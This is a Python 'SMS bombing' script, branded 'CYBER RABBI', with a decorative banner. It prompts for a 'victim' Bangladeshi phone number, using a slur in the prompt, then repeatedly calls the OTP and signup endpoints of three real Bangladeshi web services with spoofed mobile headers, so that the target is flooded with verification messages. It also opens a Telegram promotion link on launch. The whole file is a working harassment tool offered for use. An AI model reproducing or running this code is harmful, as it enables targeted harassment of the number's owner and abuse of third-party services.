#----------------------■ #!/usr/bin/python3 ■----------------------#
#----------------------■ CYBER RABBI RF  ■----------------------#
#----------------------■ TAJUL ISLAM RABBI ■----------------------#
#----------------------■ JOIN > https://t.me/@appDavlatmant ■----------------------#
#----------------------■ #!/coded/by/RABBI BHAI ■----------------------#
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import requests,os
os.system("clear")
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
rabbi="""
   \033[1;33m✧☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
   ☆ \033[1;34mᴡᴇʟᴄᴏᴍᴇ & ᴇɴᴊᴏʏ ᴛʜɪꜱ ᴛᴏᴏʟ \033[1;33m☆ 
   ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆     
\033[1;31m┏━━┓━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┏━━┓
\033[1;31m┃😈┃\033[47m\033[1;46m   𝗧𝗛𝗘 𝗖𝗬𝗕𝗘𝗥 𝗠𝗔𝗙𝗜𝗔  ➤   RABBI + ARU TOOLS   \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┗━━┛
\033[1;31m┏\033[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━━━\033[1;31m┓
\033[1;32m┃ \033[1;31m┏━┓ \033[1;36m➤  ┏━━━━━━┓    ┏━┓    ┏━━━━━┓  ┏━━━━━┓  ┏━┓  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mC\033[1;31m┃ \033[1;31m➤  ┃ ┏━━┓ ┃   ┏┛ ┗┓   ┃ ┏━┓ ┗┓ ┃ ┏━┓ ┗┓ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mY\033[1;31m┃ \033[1;32m➤  ┃ ┗━━┛ ┃  ┏┛   ┗┓  ┃ ┃ ┗┓ ┃ ┃ ┃ ┗┓ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mB\033[1;31m┃ \033[1;33m➤  ┃  ┏━━━┛ ┏┛ ┏━┓ ┗┓ ┃ ┗━━┛ ┃ ┃ ┗━━┛ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mE\033[1;31m┃ \033[1;34m➤  ┃  ┗━┓   ┃  ┗━┛  ┃ ┃ ┏━━┓ ┃ ┃ ┏━━┓ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;36mR\033[1;31m┃ \033[1;35m➤  ┃ ┏━┓┗┓  ┃ ┏━━━┓ ┃ ┃ ┃ ┏┛ ┃ ┃ ┃ ┏┛ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤  ┃ ┃ ┗┓┗┓ ┃ ┃   ┃ ┃ ┃ ┗━┛ ┏┛ ┃ ┗━┛ ┏┛ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤  ┗━┛  ┗━┛ ┗━┛   ┗━┛ ┗━━━━━┛  ┗━━━━━┛  ┗━┛  \033[1;32m┃
\033[1;32m┃ \033[1;31m┏━┓ \033[1;30m➤ \033[1;32m┏\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m┓ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mR\033[1;31m┃ \033[1;32m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;32m𝐀𝐮𝐭𝐡𝐨𝐫      \033[1;32m➤   \033[1;32mRABBI Islam    \033[1;31m┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mA\033[1;31m┃ \033[1;37m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;37m𝐆𝐢𝐭𝐇𝐮𝐛      \033[1;32m➤   \033[1;37mRABBI-404    \033[1;31m ┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mB\033[1;31m┃ \033[1;33m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;35mChannel     \033[1;32m➤   \033[1;35m@CYBER-RABBI \033[1;31m┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mB\033[1;31m┃ \033[1;34m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;36m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦    \033[1;32m➤   \033[1;36m@CYBER-RABBI   \033[1;31m  ┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mI\033[1;31m┃ \033[1;35m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;34mUpdate      \033[1;32m➤   \033[1;34marmv64-v5.0     \033[1;31m ┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤ \033[1;32m┗\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m┛ \033[1;32m┃
\033[1;31m┗\033[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━━━\033[1;31m┛
\033[1;35m║        \033[1;36m ☞𝐇𝐞𝐥𝐥𝐨 𝐇𝐚𝐜𝐤𝐞𝐫,𝐬 ☜ \033[1;35m           ║\033[1;35m
\033[1;35m╠═════════════════════════════════╣
\033[1;35m║\033[1;33m  ADMIN    : Tajul islam rabbi        \033[1;35m
\033[1;35m║ \033[1;32m TOOLS    :   SMS BOMBING       \033[1;35m
\033[1;35m║ \033[1;34m GITHUB   :    CYBER RABBI           \033[1;35m
\033[1;35m╚═════════════════════════════════╝
╔═════════════════════════════════╗
║    \033[1;37m  THANKS TO CYBER RABBI    \033[1;37m    \033[1;35m  ║\033[1;35m
╚═════════════════════════════════╝
"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ PRINT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
print(rabbi)
os.system("xdg-open https://t.me/@appDavlatmant")
nmbr=input("\033[1;31mENTER VICTIM MADARC**DER NUMBER : +880")
total=int(input("\033[1;33m ENTER SMS AMMOUNT  : "))
print("""\033[1;32m\n\nWAIT FEW SECOND AND SEE
↘""")
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+nmbr+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+nmbr
data={
  "name": nmbr,
  "phoneNumber": nmbr,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
count=0
while total>count:
  send1=requests.get(url1,headers=headers1)
  if send1.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
  else:
    pass
  send2=requests.get(url2,headers=headers2)
  if send2.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
  else:
    pass
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
    
  else:
    pass
print("""\033[1;35m
…………………………………………………………………………………………………………………………………………
  \033[1;36m  ☞CYBER RABBI BHAI ALL SMS SENT DONE ʕ•ᴥ•ʔ\033[1;35m  
…………………………………………………………………………………………………………………………………………
""")
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ CODE END BY CYBER RABBI  ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
